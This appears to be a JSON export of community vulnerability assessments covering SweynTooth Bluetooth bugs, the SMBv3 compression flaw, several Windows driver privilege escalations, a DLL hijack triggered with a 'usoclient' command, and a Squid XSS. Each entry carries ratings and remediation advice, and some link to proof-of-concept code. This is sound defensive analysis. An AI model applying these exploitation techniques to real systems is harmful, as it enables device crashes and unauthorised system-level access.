          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "017c84f2-e6c5-4b19-8916-a7cd3e6e3a72",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "1fc3f164-363d-48d0-98d9-035257ff24a5",
      "created": "2020-04-18T19:56:06.989973Z",
      "revisionDate": "2020-04-26T23:00:44.387937Z",
      "document": "This vuln is part of a related batch named **SweynTooth** from researchers at the Singapore University of Technology and Design.  The SweynTooth vulnerabilities lie within certain Bluetooth Low Energy (BLE) SDKs for Systems-on-a-Chip (SoC), which can make proliferating fixes to affected devices in the field a slow going.\r\n\r\nVulnerable devices need to be within BLE radio range in order for an attacker to target.  A successful exploit will leave the target in a deadlocked or non-functional state by sending the target a Link Layer ID packet with a value of 0.  Device recovery may require a hard reset or powercycle, and a vulnerable device will immediately become vulnerable again once it enables BLE.  A detailed explanation can be found [here](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-110006.2) in the original disclosure.  It appears the SoC manufacturer has [issued fixes](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-6001r5) for their vulnerable SDK(s).\r\n\r\nRelated, the same researchers found an SoC from Cypress which also contained a similar vulnerability ([CVE-2019-17061](https://attackerkb.com/topics/oZOveE5iAB/cve-2019-17061)), also disclosed as part of SweynTooth.\r\n\r\nEDIT: Attacker Value for this item largely depends on the type of device the vulnerable target is and behavior the device exhibits when successfully exploited.",
      "score": 2,
      "metadata": {
        "tags": [
          "no_useful_data",
          "difficult_to_patch",
          "pre_auth",
          "default_configuration",
          "easy_to_develop"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "f3f5dabc-f6d2-476d-8f29-96ce43d37d18",
      "editorId": "239a8bee-6464-4a18-9335-6787b97689b3",
      "topicId": "6c9e5b3a-8549-4773-bcfd-2785d608d524",
      "created": "2020-04-19T02:42:55.862136Z",
      "revisionDate": "2020-04-26T22:59:26.60332Z",
      "document": "This vuln is part of a related batch named **SweynTooth** from researchers at the Singapore University of Technology and Design.  The SweynTooth vulnerabilities lie within certain Bluetooth Low Energy (BLE) SDKs for Systems-on-a-Chip (SoC), which can make proliferating fixes to affected devices in the field a slow going.\r\n\r\nVulnerable devices need to be within BLE radio range in order for an attacker to target.  A successful exploit will leave the target in a crashed or non-functional state via a Buffer Overflow (BOF), triggered by sending a packet with a large Link Layer Length value.  While a simple attack results in a denial-of-service (DoS), the nature of the vulnerability being a BOF leaves the door open for further exploration to potentially gain code execution on a target.  In their testing, researchers were able to crash a [FitBit Inspire device](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-4002r2) containing this vulnerability, which resulted in an immediate reboot of the device.  A detailed explanation can be found [here](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-100006.1) in the original disclosure, as well as some potentially vulnerable devices in [this list](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-5002r4).  It appears the SoC manufacturer has [issued fixes](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-6001r5) for their vulnerable SDK(s).\r\n\r\nRelated, the same researchers found an SoC from NXP which also contained a similar vulnerability ([CVE-2019-17519](https://attackerkb.com/topics/MYYtGiOv0l/cve-2019-17519)), also disclosed as part of SweynTooth.\r\n\r\nEDIT: Attacker Value for this item largely depends on the type of device the vulnerable target is and behavior the device exhibits when successfully exploited.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "no_useful_data",
          "difficult_to_patch",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "848b04bb-32fa-4c2b-8702-aff57cc6f041",
      "editorId": "239a8bee-6464-4a18-9335-6787b97689b3",
      "topicId": "aacf2ec5-3787-4e54-9883-daf8d625e7cb",
      "created": "2020-04-19T02:45:01.279192Z",
      "revisionDate": "2020-04-26T22:59:05.200894Z",
      "document": "This vuln is part of a related batch named **SweynTooth** from researchers at the Singapore University of Technology and Design.  The SweynTooth vulnerabilities lie within certain Bluetooth Low Energy (BLE) SDKs for Systems-on-a-Chip (SoC), which can make proliferating fixes to affected devices in the field a slow going.\r\n\r\nVulnerable devices need to be within BLE radio range in order for an attacker to target.  A successful exploit will leave the target in a crashed or non-functional state via a Buffer Overflow (BOF), triggered by sending a packet with a large Link Layer Length value.  While a simple attack results in a denial-of-service (DoS), the nature of the vulnerability being a BOF leaves the door open for further exploration to potentially gain code execution on a target.  A detailed explanation can be found [here](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-100006.1) in the original disclosure, as well as some potentially vulnerable devices in [this list](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-5002r4).  It appears the SoC manufacturer has [issued fixes](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-6001r5) for their vulnerable SDK(s).\r\n\r\nRelated, the same researchers found an SoC from Cypress which also contained a similar vulnerability ([CVE-2019-16336](https://attackerkb.com/topics/MiRCfMso24/cve-2019-16336)), also disclosed as part of SweynTooth.\r\n\r\nEDIT: Attacker Value for this item largely depends on the type of device the vulnerable target is and behavior the device exhibits when successfully exploited.",
      "score": 1,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "pre_auth",
          "easy_to_develop",
          "default_configuration",
          "no_useful_data"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "7f44014a-b522-42f3-8def-8ea740d0768b",
      "editorId": "239a8bee-6464-4a18-9335-6787b97689b3",
      "topicId": "7682aad5-0aef-416b-9139-82542d45451f",
      "created": "2020-04-21T02:11:29.293536Z",
      "revisionDate": "2020-04-26T22:58:51.610081Z",
      "document": "This vuln is part of a related batch named **SweynTooth** from researchers at the Singapore University of Technology and Design.  The SweynTooth vulnerabilities lie within certain Bluetooth Low Energy (BLE) SDKs for Systems-on-a-Chip (SoC), which can make proliferating fixes to affected devices in the field a slow going.\r\n\r\nVulnerable devices need to be within BLE radio range in order for an attacker to target.  A successful exploit will leave the target in a deadlocked state, triggered by sending two consecutive Attribute Protocol (ATT) request packets during a connection event.  If a watchdog or similar mechanism is enabled, an exploited target may restart without intervention (otherwise, a hard powercycle may be required).  A detailed explanation can be found [here](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-160006.7) in the original disclosure.  It is unclear if the SoC manufacturer has [issued fixes](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-6001r5) for their vulnerable SDK(s).\r\n\r\nEDIT: Attacker Value for this item largely depends on the type of device the vulnerable target is and behavior the device exhibits when successfully exploited.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "no_useful_data",
          "difficult_to_patch",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "de1037c5-4e93-4762-a797-fca908799c03",
      "editorId": "abb6ceab-a256-4e5d-9b04-dcfc1ba00970",
      "topicId": "e85583cb-111d-4d95-80e5-4cd53bb1f952",
      "created": "2020-04-21T03:50:50.925589Z",
      "revisionDate": "2020-06-09T16:31:05.040354Z",
      "document": "This vulnerability exploits an integer overflow vulnerability that exists in SMBv3.1.1\u2019s decompression algorithm which is within it\u2019s kernel-mode driver (srv2.sys), srv2!Srv2DecompressData is the routine which is responsible for the decompression of compressed request packets. The successful exploitation of this vulnerability will allow an unprivileged user pre authenticated remote code execution which can grant a system level shell.\r\n\r\nThe impact that the exploitation of this vulnerability has is very high, due to this  having the ability to be exploited remotely and the sense that it grants system level access in kernel mode.  This vulnerability has also been deemed as wormable which makes it a priority for attackers to utilize.\r\n\r\nMicrosoft has released a patch for this, and everyone should take proper precautions when enabling compression within SMB.\r\n",
      "score": 6,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "obscure_configuration",
          "difficult_to_develop",
          "common_enterprise",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "ef339ff8-49f4-45a2-b427-9e36dbd8ad39",
      "editorId": "abb6ceab-a256-4e5d-9b04-dcfc1ba00970",
      "topicId": "fcd6bd45-ab66-4764-aff8-e1adcdc65e40",
      "created": "2020-04-21T04:04:21.966876Z",
      "revisionDate": "2020-06-10T14:58:09.21236Z",
      "document": "This vulnerability takes advantage of a null pointer dereference within the Windows win32k.sys driver, win32k.sys is notorious for including GDI objects and other objects that can be abused and utilized for various types of exploitation. This vulnerability takes advantage of pop-up menu objects, and exploitation of this vulnerability can grant the user system access, AKA Escalation of privilege. This vulnerability displays a menu using the TrackPopupMenu function, And code that is hooked to EVENT_SYSTEM_MENUPOPUPSTART gets executed. \r\n\r\nThis vulnerability also flips the  bServerSideWindowProc bit within the tagWND data structure, Also it utilizes the tagWND structure to leak kernel memory addresses.\r\n\r\nThis vulnerability seems to be mitigated on the newer versions of windows, within Windows 8.1 with the introduction of various mitigations, null pointer dereference vulnerabilities stopped existing. And on some newer and more previous windows 10 security updates, there have been mitigations to prevent kernel address leakage from the tagWND structure.\r\n",
      "score": 6,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth",
          "requires_interaction"
        ],
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "900506ab-c2b7-446d-aa60-c222676e875a",
      "editorId": "abb6ceab-a256-4e5d-9b04-dcfc1ba00970",
      "topicId": "ea8cadeb-c388-4ad1-9f8b-e47d2a982039",
      "created": "2020-04-21T05:42:36.946107Z",
      "revisionDate": "2020-05-17T18:01:01.181814Z",
      "document": "This vulnerability takes advantage of an exposed IOCTL code (0x80112084) within the kerneld.sys driver that's included within AIDA64. One of the control registers in the x86 instruction set is known as the MSR, the Model specific register is used for debugging, program execution tracing, computer performance monitoring and managing and toggling certain CPU functionality.. This driver instructs a binary to modify this register on the victim system, and successful exploitation of this vulnerability can allow for ring-0 code execution from an unauthorized and unauthenticated user mode standpoint. Successful exploitation of an exposed write WRMSR instruction can give us a pointer overwrite primitive. Because this driver does not appropriately filter access to MSRs which will allow an attacker to overwrite It and our pointer is called in ring-0. \r\n\r\nThe commonly used technique for this, is an attacked will use this R/W from the physical MSR register, and use that to traverse SYSTEM processes EPROCESS structure for SYSTEM level tokens, and either spawning a new process or swapping the new SYSTEM token with their current processes.\r\n\r\nOn January 1st FireEye contacted the vendor with disclosure of the vulnerability. And on November 4th, 2019 FireEye verified that the issue was successfully resolved.\r\n\r\nThe recommended mitigation is to update your current AIDA64 with the latest provided version of the software.\r\n",
      "score": 6,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "pre_auth",
          "requires_interaction",
          "difficult_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "e558fdfd-8455-49c0-ad94-0dc8ac8ea9e6",
      "editorId": "abb6ceab-a256-4e5d-9b04-dcfc1ba00970",
      "topicId": "2b9d4058-c862-4c25-81bc-e7ac35190d25",
      "created": "2020-04-21T15:30:06.844154Z",
      "revisionDate": "2020-04-28T21:37:53.192313Z",
      "document": "**Overview**\r\n\r\nA vulnerability was discovered within the Viper driver RGB version 11, where it did not properly perform input sanitize action against IOCTL 0x80102040 input from user mode. Successful exploitation of this vulnerability leads to the escalation of a user's privilege,  allowing for an unauthorized and  unauthenticated user to obtain system privileges.  The vulnerability class for this driver CVE is a standard stack-based buffer overflow.\r\n\r\nA proof-of-concept does exist, provided by core security, the proof-of-concept is proven to work on a Windows 7 system, porting this vulnerability to a higher version of Windows would require additional security mitigation bypasses.\r\n\r\n**Impact**\r\n\r\n Including this vulnerable version of this driver on your system will lead to a degradation of integrity and diminishes all aspects of security for the host. This vulnerable driver allows for an attacker to obtain higher levels of privilege than they're supposed to have from an unauthenticated standpoint. \r\n\r\n**Recommended remediation**\r\n\r\nThe recommended remediation for this vulnerability is to update your drivers and to follow any guidelines for updating the software that provides this vulnerable driver.\r\n",
      "score": 5,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "pre_auth",
          "requires_interaction",
          "default_configuration",
          "difficult_to_patch",
          "high_privilege_access"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "9e4e2b5b-d755-4701-ac8a-f5750c70e5cd",
      "editorId": "abb6ceab-a256-4e5d-9b04-dcfc1ba00970",
      "topicId": "13130520-c101-492f-a46d-2493829d51d8",
      "created": "2020-04-21T17:01:51.077691Z",
      "revisionDate": "2020-04-28T21:37:47.005878Z",
      "document": "### [edit] \r\n\r\nthis assessment is covering one of the POC techniques used to exploit the vulnerability, I much prefer the way @bwatters-r7 covers the details of the vulnerability. \r\n\r\nThis CVE includes an incorrect description (a very weak description that does a poor job of describing the actual vulnerability) please see the sources/citations/original CVE POC postings, I have also reached out to the POC authors.\r\n\r\n**Overview**\r\n\r\nA vulnerability was discovered within the Update Orchestrator Service within Windows 10, This service allows for updating and checking for updates on a Windows system. A user has the ability to interact with the service using COM  to provide an update scan or to download any pending updates for the system.\r\n\r\n\r\nThis service runs under  SYSTEM on the window system, and it tries to load a missing dll. This vulnerability can be classed as a dll hijacking vulnerability, where a user can add the windowscoredeviceinfo.dll To the windows system32 directory, and you can have it loaded by the Uso service to obtain arbitrary code execution at a system level.\r\n\r\nAfter someone with the ability to write to the system 32 directory, either an administrator or a low-level user that has some sort of arbitrary right primitive, a user can then use the command `usoclient StartInteractiveScan` as a trigger for the vulnerability.\r\n\r\n**Impact**\r\n\r\nSuccessful exploitation of this vulnerability can lead to an unauthorized and unauthenticated user obtaining system-level access in kernel mode on the system. Successful exploitation of this  vulnerability can grant a user from a low Integrity standpoint to obtain NT/Authority access.\r\n\r\nThis vulnerability would allow for the degradation of the integrity and security of  the victim's house system. \r\n\r\nA working proof-of-concept  for the exploitation of this vulnerability does exist.\r\n\r\nhttps://www.youtube.com/watch?v=ml2feXa6cCY\r\nhttps://github.com/nu11secur1ty/Windows10Exploits/tree/master/Undefined/CVE-2020-0668\r\n\r\n**Recommended remediation**\r\n\r\nThe recommended security remediation for this vulnerability is to follow the provided security updates from Microsoft, and await any sort of patching that your company may push out.\r\n\r\n----\r\n\r\n```\r\nC:\\Users\\123>sc qc UsoSvc\r\n[SC] QueryServiceConfig SUCCESS\r\n\r\nSERVICE_NAME: UsoSvc\r\n        TYPE               : 20  WIN32_SHARE_PROCESS\r\n        START_TYPE         : 2   AUTO_START\r\n        ERROR_CONTROL      : 1   NORMAL\r\n        BINARY_PATH_NAME   : C:\\Windows\\system32\\svchost.exe -k netsvcs\r\n        LOAD_ORDER_GROUP   :\r\n        TAG                : 0\r\n        DISPLAY_NAME       : Update Orchestrator Service for Windows Update\r\n        DEPENDENCIES       : rpcss\r\n        SERVICE_START_NAME : LocalSystem\r\n```\r\n",
      "score": 7,
      "metadata": {
        "tags": [
          "post_auth",
          "default_configuration",
          "high_privilege_access",
          "requires_interaction",
          "easy_to_develop"
        ],
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "d934ae27-6d5d-476b-8547-d5a6da2ef824",
      "editorId": "543c770b-f33d-48d0-aed7-3a2525de4ba4",
      "topicId": "534461ec-0e7c-42e7-9d2e-382220b30bce",
      "created": "2020-04-21T22:49:25.185183Z",
      "revisionDate": "2020-05-15T16:09:31.157727Z",
      "document": "**Bottom line:** The commonName property of the certificate that signs the \"failed to connect securely\" error page within Squid gets rendered as HTML on the client/victim side. \r\n\r\nIn order to successfully exploit this XSS one would need to write a malicious .pem file in the location specified by squid.conf or modify squid.conf to point to an existing malicious .pem file.\r\n\r\nIf I had root level access to the filesystem on a squid box, serving a XSS from the error page would not be as useful as any number of other things that could be done. Similarly story if you MITM the victim. \r\n\r\nPoC @ https://github.com/JonathanWilbur/CVE-2018-19131",
      "score": 3,
      "metadata": {
        "tags": [
          "no_useful_data",
          "difficult_to_develop",
          "post_auth"
        ],
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "fdc77b2e-d3af-40c3-82fe-784e99c19b87",
      "editorId": "8161de0b-582f-4526-b380-331dc7475a2d",
      "topicId": "556f3a24-1d91-4765-a7ee-7842b00edd85",
      "created": "2020-04-22T08:32:40.374715Z",
      "revisionDate": "2020-04-22T08:32:40.377002Z",
      "document": "Exploit steps were published by [SSD Advisory](https://ssd-disclosure.com/ssd-advisory-cisco-anyconnect-privilege-elevation-through-path-traversal/) (files are mentioned but no download seems available). Instructions are precise enough to re-create it.\r\nLocal privilege escalation from unprivileged user to SYSTEM",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "common_enterprise",
          "post_auth",
          "easy_to_develop",
          "high_privilege_access"
        ],
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "a1cfdb26-3a1d-4b7e-8b47-ead417a18c4e",
      "editorId": "abb6ceab-a256-4e5d-9b04-dcfc1ba00970",
      "topicId": "e6bf01a5-8a56-4c6b-a2a3-3c7aabb61a02",
      "created": "2020-04-22T14:37:43.147262Z",
      "revisionDate": "2020-04-28T21:37:43.2274Z",
      "document": "**Overview**\r\n\r\nA vulnerability was discovered within CyberArk Endpoint Privilege Managers driver (CybKernelTracker.sys). This driver contains a  call back functionality that is called every time for an image or a dll to be loaded loaded on the system, this callback allocates non paged pool memory (allocates memory from the kernel pool), and the allocation occurs to copy the image path of the object being loaded, but it does not take into account the buffer size of the path size. By loading an object (image) that is longer than the buffer size,  an attacker is able to overwrite part of the kernel non paged pool memory  invoking a kernel pool overflow.\r\n\r\nThis callback routine is not loaded into the system by default, but once installed, successful exploitation of this vulnerability can allow for an unprivileged and non authenticated user to obtain system-level access on the system. \r\n\r\n**Impact**\r\n\r\nIncluding this vulnerable driver on your system can lead to the degradation of your systems security and integrity, the impact risk is very high due to a non privileged user being able to communicate with this driver. Successful exploitation of this vulnerability can allow a user to either escalate their privileges by weaponizing a proof-of-concept, or simply crashing and dosing the system. \r\n\r\n**Recommended remediation**\r\n\r\nThe recommended remediation and fix for this vulnerability is to update your cyberark software to the latest version, cyberark has responded to this vulnerability and patched it with a newly released version of the updated driver. \r\n\r\n",
      "score": 5,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth",
          "obscure_configuration"
        ],
